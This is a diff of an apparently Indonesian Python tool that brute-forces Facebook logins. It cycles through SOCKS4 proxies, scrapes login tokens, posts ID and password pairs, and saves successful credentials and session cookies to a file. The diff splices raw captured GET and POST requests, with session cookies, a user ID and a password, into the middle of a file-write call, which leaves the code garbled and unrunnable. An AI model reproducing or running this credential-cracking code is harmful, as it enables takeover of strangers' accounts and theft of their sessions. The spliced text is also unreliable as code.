@@ -262,31 +262,6 @@ def md1(idf,pwv):
     try:
       nip=random.choice(proxsi)
       proxs= {'http': 'socks4://'+nip}
-      ses.headers.update({"Host": "m.facebook.com","cache-control": "max-age=0","user-agent": ua,"accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="104"',"sec-ch-ua-mobile": "?1","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","sec-fetch-user": "?1","upgrade-insecure-requests": "1","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
-      p = ses.get("https://m.facebook.com/login.php?skip_api_login=1&api_key=2076461462396807&kid_directed_site=0&app_id=2076461462396807&signed_next=1&next=https%3A%2F%2Ffree.facebook.com%2Fdialog%2Foauth%3Fresponse_type%3Dcode%26client_id%3D2076461462396807%26redirect_uri%3Dhttps%253A%252F%252Fduniagames.co.id%252Fnew-callback%26scope%3Dpublic_profile%252Cemail%26code_challenge%3DYqn9YmMbIY9awk-vWUaq_BuuPrndLEOUQXVYSH1Rleo%26code_challenge_method%3DS256%26state%3D2t0u9qzy4ubndt6ek29y6n1obo9mojr%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dd614149f-136e-431f-babf-db7f365bce91%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fduniagames.co.id%2Fnew-callback%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D2t0u9qzy4ubndt6ek29y6n1obo9mojr%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr")
-      dataa ={'lsd': re.search('name="lsd" value="(.*?)"',str(p.text)).group(1), 'jazoest': re.search('name="jazoest" value="(.*?)"',str(p.text)).group(1), 'm_ts': re.search('name="m_ts" value="(.*?)"',str(p.text)).group(1), 'li': re.search('name="li" value="(.*?)"',str(p.text)).group(1), 'try_number': '0', 'unrecognized_tries': '0', 'email': idf, 'pass': pw, 'prefill_contact_point': '', 'prefill_source': '', 'prefill_type': '', 'first_prefill_source': '', 'first_prefill_type': '', 'had_cp_prefilled': 'false', 'had_password_prefilled': 'false', 'is_smart_lock': 'false', 'bi_xrwh': re.search('name="bi_xrwh" value="(.*?)"',str(p.text)).group(1)}
-      koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
-      koki+=' m_pixel_ratio=2.625; wd=412x756'
-      heade= {
-      "Host": "m.facebook.com",
-      "content-length": f"{len(str(dataa))}",
-      "x-fb-lsd": re.search('name="lsd" value="(.*?)"',str(p.text)).group(1),
-      "origin": "https://m.facebook.com",
-      "content-type": "application/x-www-form-urlencoded",
-      "user-agent": ua, #'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
-    'viewport-width': '980',
-      "accept": "*/*",
-      "x-requested-with": "Linux",
-      "sec-ch-ua": '"Chromium";v="106", "Google Chrome";v="106", "Not;A=Brand";v="99"',
-      "sec-ch-ua-platform": '"Android"',
-      "sec-ch-ua-mobile": "?1",
-      "sec-fetch-site": "same-origin",
-      "sec-fetch-mode": "cors",
-      "sec-fetch-dest": "empty",
-      "sec-fetch-user": "?0",
-      "referer": "https://m.facebook.com/dialog/oauth?response_type=code&client_id=2076461462396807&redirect_uri=https%3A%2F%2Fduniagames.co.id%2Fnew-callback&scope=public_profile%2Cemail&code_challenge=Yqn9YmMbIY9awk-vWUaq_BuuPrndLEOUQXVYSH1Rleo&code_challenge_method=S256&state=2t0u9qzy4ubndt6ek29y6n1obo9mojr&ret=login&fbapp_pres=0&logger_id=d614149f-136e-431f-babf-db7f365bce91&tp=unspecified",
-      "accept-encoding": "gzip, deflate br",
-      "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"}
       po = ses.post('https://m.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False,proxies=proxs)
       if "checkpoint" in po.cookies.get_dict().keys():
         idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
@@ -303,7 +278,116 @@ def md1(idf,pwv):
         print(f'\r{H} [Asdel-Ok] {idf}|{pw}{xxx}')
         if 'y' in cokix:
          print(f'\r{B} Cookies {M}: {P}'+kuki)
-        open('/sdcard/XYTEEE-XC-OK.txt','a').write(idf+'|'+pw+'|'+kuki+'\n');cek_apk(kuki)
+        open('GETTTTTTTTTTTTTTTTTT
+
+
+import requests
+
+cookies = {
+    'dbln': '%7B%22100055168085501%22%3A%222XmJ6fAQ%22%2C%22100093978404122%22%3A%22C6A7XyTQ%22%2C%22100079146000642%22%3A%22PvmKCYRO%22%2C%22100091567946364%22%3A%220D3fh68o%22%7D',
+    'sb': 'hKNyZquGhe1kONCf07qbN4Tw',
+    'datr': 'hKNyZm9uw5WgL1cvR-kHM2_1',
+    'ps_n': '1',
+    'ps_l': '1',
+    'oo': 'v1',
+    'locale': 'id_ID',
+    'fr': '1yTTCNT5adXhTQw1J.AWU60cGIbbIfQoJVGfNWXvBKBfc.BmiOcu..AAA.0.0.BmiOdC.AWUvSdbkfrY',
+    'wd': '600x678',
+}
+
+headers = {
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'accept-language': 'en-US,en;q=0.9',
+    # 'cookie': 'dbln=%7B%22100055168085501%22%3A%222XmJ6fAQ%22%2C%22100093978404122%22%3A%22C6A7XyTQ%22%2C%22100079146000642%22%3A%22PvmKCYRO%22%2C%22100091567946364%22%3A%220D3fh68o%22%7D; sb=hKNyZquGhe1kONCf07qbN4Tw; datr=hKNyZm9uw5WgL1cvR-kHM2_1; ps_n=1; ps_l=1; oo=v1; locale=id_ID; fr=1yTTCNT5adXhTQw1J.AWU60cGIbbIfQoJVGfNWXvBKBfc.BmiOcu..AAA.0.0.BmiOdC.AWUvSdbkfrY; wd=600x678',
+    'dpr': '1',
+    'priority': 'u=0, i',
+    'sec-ch-prefers-color-scheme': 'dark',
+    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
+    'sec-ch-ua-full-version-list': '"Not/A)Brand";v="8.0.0.0", "Chromium";v="126.0.6478.127", "Google Chrome";v="126.0.6478.127"',
+    'sec-ch-ua-mobile': '?0',
+    'sec-ch-ua-model': '""',
+    'sec-ch-ua-platform': '"Windows"',
+    'sec-ch-ua-platform-version': '"10.0.0"',
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'none',
+    'sec-fetch-user': '?1',
+    'upgrade-insecure-requests': '1',
+    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
+    'viewport-width': '255',
+}
+
+response = requests.get(
+    'https://free.facebook.com/login/device-based/password/?uid=100072092557940&flow=login_no_pin&login.php?skip_api_login=1&api_key=1722713787887984&kid_directed_site=0&app_id=1722713787887984&signed_next=1&next=https%3A%2F%2Ffree.facebook.com%2Fv14.0%2Fdialog%2Foauth%3Fapp_id%3D1722713787887984%26cbt%3D1720248184680%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df8ee23a16ba48cd8a%2526domain%253Dwww.bilibili.tv%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.bilibili.tv%25252Ff8d03246faea8e82d%2526relation%253Dopener%26client_id%3D1722713787887984%26display%3Dpopup%26domain%3Dwww.bilibili.tv%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.bilibili.tv%252Fid%252Fvideo%252F2042683343%26locale%3Den_US%26logger_id%3Dfc720bf7cf7cff559%26origin%3D1%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df81c1bcedc750e7a2%2526domain%253Dwww.bilibili.tv%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.bilibili.tv%25252Ff8d03246faea8e82d%2526relation%253Dopener%2526frame%253Df2fcced5eabe599fc%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Demail%26sdk%3Djoey%26version%3Dv14.0%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df81c1bcedc750e7a2%26domain%3Dwww.bilibili.tv%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.bilibili.tv%252Ff8d03246faea8e82d%26relation%3Dopener%26frame%3Df2fcced5eabe599fc%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=popup&locale=id_ID&pl_dbl=0',
+    cookies=cookies,
+    headers=headers,
+)
+
+
+POSTTTTTTTTTTTTTT
+
+
+
+import requests
+
+cookies = {
+    'dbln': '%7B%22100055168085501%22%3A%222XmJ6fAQ%22%2C%22100093978404122%22%3A%22C6A7XyTQ%22%2C%22100079146000642%22%3A%22PvmKCYRO%22%2C%22100091567946364%22%3A%220D3fh68o%22%7D','sb': 'hKNyZquGhe1kONCf07qbN4Tw',
+    'datr': 'hKNyZm9uw5WgL1cvR-kHM2_1',
+    'ps_n': '1',
+    'ps_l': '1',
+    'oo': 'v1',
+    'locale': 'id_ID',
+    'wd': '600x678',
+    'fr': '1yTTCNT5adXhTQw1J.AWV6xKXFXTIURGn1LI8p1A9jjPc.BmiOcu..AAA.0.0.BmiOhT.AWXb7cj6MgQ',
+}
+
+headers = {
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'accept-language': 'en-US,en;q=0.9',
+    'cache-control': 'max-age=0',
+    'content-type': 'application/x-www-form-urlencoded',
+    # 'cookie': 'dbln=%7B%22100055168085501%22%3A%222XmJ6fAQ%22%2C%22100093978404122%22%3A%22C6A7XyTQ%22%2C%22100079146000642%22%3A%22PvmKCYRO%22%2C%22100091567946364%22%3A%220D3fh68o%22%7D; sb=hKNyZquGhe1kONCf07qbN4Tw; datr=hKNyZm9uw5WgL1cvR-kHM2_1; ps_n=1; ps_l=1; oo=v1; locale=id_ID; wd=600x678; fr=1yTTCNT5adXhTQw1J.AWV6xKXFXTIURGn1LI8p1A9jjPc.BmiOcu..AAA.0.0.BmiOhT.AWXb7cj6MgQ',
+    'dpr': '1',
+    'origin': 'https://free.facebook.com',
+    'priority': 'u=0, i',
+    'referer': 'https://free.facebook.com/login/device-based/password/?uid=100072092557940&flow=login_no_pin&login.php?skip_api_login=1&api_key=1722713787887984&kid_directed_site=0&app_id=1722713787887984&signed_next=1&next=https%3A%2F%2Ffree.facebook.com%2Fv14.0%2Fdialog%2Foauth%3Fapp_id%3D1722713787887984%26cbt%3D1720248184680%26channel_url%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df8ee23a16ba48cd8a%2526domain%253Dwww.bilibili.tv%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.bilibili.tv%25252Ff8d03246faea8e82d%2526relation%253Dopener%26client_id%3D1722713787887984%26display%3Dpopup%26domain%3Dwww.bilibili.tv%26e2e%3D%257B%257D%26fallback_redirect_uri%3Dhttps%253A%252F%252Fwww.bilibili.tv%252Fid%252Fvideo%252F2042683343%26locale%3Den_US%26logger_id%3Dfc720bf7cf7cff559%26origin%3D1%26redirect_uri%3Dhttps%253A%252F%252Fstaticxx.facebook.com%252Fx%252Fconnect%252Fxd_arbiter%252F%253Fversion%253D46%2523cb%253Df81c1bcedc750e7a2%2526domain%253Dwww.bilibili.tv%2526is_canvas%253Dfalse%2526origin%253Dhttps%25253A%25252F%25252Fwww.bilibili.tv%25252Ff8d03246faea8e82d%2526relation%253Dopener%2526frame%253Df2fcced5eabe599fc%26response_type%3Dtoken%252Csigned_request%252Cgraph_domain%26scope%3Demail%26sdk%3Djoey%26version%3Dv14.0%26ret%3Dlogin%26fbapp_pres%3D0%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df81c1bcedc750e7a2%26domain%3Dwww.bilibili.tv%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.bilibili.tv%252Ff8d03246faea8e82d%26relation%3Dopener%26frame%3Df2fcced5eabe599fc%26error%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied&display=popup&locale=id_ID&pl_dbl=0',
+    'sec-ch-prefers-color-scheme': 'dark',
+    'sec-ch-ua': '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
+    'sec-ch-ua-full-version-list': '"Not/A)Brand";v="8.0.0.0", "Chromium";v="126.0.6478.127", "Google Chrome";v="126.0.6478.127"',
+    'sec-ch-ua-mobile': '?0',
+    'sec-ch-ua-model': '""',
+    'sec-ch-ua-platform': '"Windows"',
+    'sec-ch-ua-platform-version': '"10.0.0"',
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'same-origin',
+    'sec-fetch-user': '?1',
+    'upgrade-insecure-requests': '1',
+    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36',
+    'viewport-width': '255',
+}
+
+params = {
+    'shbl': '0',
+    'locale2': 'id_ID',
+}
+
+data = {
+    'lsd': 'AVpThuurptQ',
+    'jazoest': '21108',
+    'uid': '100072092557940',
+    'next': 'https://free.facebook.com/v14.0/dialog/oauth?app_id=1722713787887984&cbt=1720248184680&channel_url=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df8ee23a16ba48cd8a%26domain%3Dwww.bilibili.tv%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.bilibili.tv%252Ff8d03246faea8e82d%26relation%3Dopener&client_id1722713787887984&display=popup&domain=www.bilibili.tv&e2e=%7B%7D&fallback_redirect_uri=https%3A%2F%2Fwww.bilibili.tv%2Fid%2Fvideo%2F2042683343&locale=en_US&logger_id=fc720bf7cf7cff559&origin=1&redirect_uri=https%3A%2F%2Fstaticxx.facebook.com%2Fx%2Fconnect%2Fxd_arbiter%2F%3Fversion%3D46%23cb%3Df81c1bcedc750e7a2%26domain%3Dwww.bilibili.tv%26is_canvas%3Dfalse%26origin%3Dhttps%253A%252F%252Fwww.bilibili.tv%252Ff8d03246faea8e82d%26relation%3Dopener%26frame%3Df2fcced5eabe599fc&response_type=token%2Csigned_request%2Cgraph_domain&scope=email&sdk=joey&version=v14.0&ret=login&fbapp_pres=0&tp=unspecified',
+    'flow': 'login_no_pin',
+    'pass': 'faffsafsa',
+}
+
+response = requests.post(
+    'https://free.facebook.com/login/device-based/validate-password/',
+    params=params,
+    cookies=cookies,
+    headers=headers,
+    data=data,)
+    /sdcard/XYTEEE-XC-OK.txt','a').write(idf+'|'+pw+'|'+kuki+'\n');cek_apk(kuki)
         break
       else:
         continue
